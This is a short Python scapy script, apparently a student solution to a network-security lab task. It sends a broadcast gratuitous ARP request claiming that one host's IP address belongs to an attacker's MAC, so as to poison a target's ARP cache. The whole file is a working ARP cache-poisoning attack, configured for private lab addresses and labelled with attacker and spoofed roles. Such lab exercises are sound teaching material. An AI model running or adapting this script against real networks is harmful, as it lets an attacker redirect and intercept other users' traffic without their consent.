#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp
import time

# --- Configuration ---
IP_A_TARGET = "10.9.0.5"
MAC_A_TARGET = "02:42:0a:09:00:05"

IP_B_SPOOFED = "10.9.0.6"

MAC_M_ATTACKER = "02:42:0a:09:00:69"

# Broadcast MAC address for the Ethernet frame destination
MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"

def send_gratuitous_arp():
    """
    Constructs and sends a single gratuitous ARP packet.
    This packet announces that IP_B_SPOOFED is at MAC_M_ATTACKER.
    """
    print(f"[*] Sending Gratuitous ARP for {IP_B_SPOOFED} mapping to {MAC_M_ATTACKER}")
    print(f"[*] Target Host A: ({IP_A_TARGET})")

    ether_frame = Ether(dst=MAC_BROADCAST, src=MAC_M_ATTACKER)
    arp_packet = ARP(op=1, # ARP Request
                      hwsrc=MAC_M_ATTACKER,
                      psrc=IP_B_SPOOFED,
                      hwdst="00:00:00:00:00:00", # Target MAC for ARP payload
                      pdst=IP_B_SPOOFED)
    packet = ether_frame / arp_packet

    try:
        sendp(packet, verbose=False)
        print("[+] Gratuitous ARP packet sent successfully.")
    except Exception as e:
        print(f"[!] Error sending packet: {e}")

if __name__ == "__main__":
    # This script will send one gratuitous ARP packet.
    # For Task 1.C, sending it once should be sufficient to observe the cache change.

    print("--- ARP Poisoning Script (Task 1.C - Gratuitous ARP) ---")
    send_gratuitous_arp()

